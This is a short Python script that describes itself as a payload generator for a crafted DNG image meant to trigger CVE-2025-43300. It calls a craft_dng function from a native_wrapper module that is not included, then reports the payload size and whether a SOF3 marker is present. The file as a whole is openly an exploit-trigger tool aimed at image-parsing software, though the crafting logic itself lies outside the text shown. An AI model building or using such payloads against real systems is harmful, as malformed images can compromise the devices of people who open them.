"""DNG payload generator (CVE-2025-43300 trigger)."""

from native_wrapper import craft_dng


def build_dng_payload(size=1024):
    return craft_dng(size=size)


if __name__ == "__main__":
    dng = build_dng_payload()
    print(f"DNG payload: {len(dng)} bytes")
    print(f"SOF3 present: {b'\xff\xc3' in dng}")